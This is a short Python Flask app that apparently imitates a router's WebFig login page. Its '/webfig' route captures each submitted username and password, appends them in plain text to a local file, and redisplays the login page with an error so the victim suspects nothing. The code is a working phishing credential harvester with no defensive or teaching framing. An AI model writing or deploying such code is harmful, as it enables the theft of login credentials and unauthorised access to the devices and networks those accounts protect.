from flask import Flask , request , redirect , url_for , render_template , flash

app = Flask(__name__)

def save_file(username , password):
    txt = open('saved.txt' , 'a')
    base = 'username : {} , password : {}\n-------------------\n'.format(username , password)
    txt.write(base)
    

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/webfig' , methods=['GET' , 'POST'])
def webfig():
    username = request.form.get('name')
    password = request.form.get('password')
    save_file(username , password)
    return render_template('index.html' , errormsg='show')